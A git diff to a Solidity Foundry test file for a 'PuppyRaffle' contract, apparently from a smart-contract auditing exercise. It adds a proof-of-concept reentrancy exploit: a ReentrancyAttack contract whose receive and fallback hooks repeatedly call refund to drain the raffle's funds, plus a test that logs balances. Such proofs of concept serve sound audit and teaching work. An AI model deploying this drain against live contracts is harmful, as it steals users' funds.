@@ -213,4 +213,69 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
+
+    // forge test --match-test  testReentrancy -vvv
+    function testReentrancy() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReentrancyAttack reentrancyAttack = new ReentrancyAttack(puppyRaffle, entranceFee);
+
+        vm.deal(address(reentrancyAttack), 1 ether);
+
+        uint256 puppyRaffleBalance1 = address(puppyRaffle).balance / 1e18;
+        uint256 attackBalance1 = address(reentrancyAttack).balance / 1e18;
+
+        reentrancyAttack.attack();
+
+        uint256 puppyRaffleBalance2 = address(puppyRaffle).balance / 1e18;
+        uint256 attackBalance2 = address(reentrancyAttack).balance / 1e18;
+
+        console.log("puppyRaffleBalance1 = ", puppyRaffleBalance1);
+        console.log("puppyRaffleBalance2 = ", puppyRaffleBalance2);
+        console.log("attackBalance1 = ", attackBalance1);
+        console.log("attackBalance2 = ", attackBalance2);
+    }
+}
+
+
+contract ReentrancyAttack {
+    PuppyRaffle public puppyRaffle;
+    uint256 public entranceFee;
+    uint256 public index;
+
+    constructor(PuppyRaffle _puppyRaffle, uint256 _entranceFee){
+        puppyRaffle = _puppyRaffle;
+        entranceFee = _entranceFee;
+    }
+
+    function attack() public {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+
+        puppyRaffle.enterRaffle{value: entranceFee * 1}(players);
+
+        index = puppyRaffle.getActivePlayerIndex(players[0]);
+
+        puppyRaffle.refund(index);
+    }
+
+    function stealMoney(uint256 _index) internal {
+        if(address(puppyRaffle).balance >= entranceFee){
+            puppyRaffle.refund(_index);
+        }
+    }
+
+    receive() external payable{
+        stealMoney(index);
+    }
+
+    fallback() external payable{
+        stealMoney(index);
+    }
 }
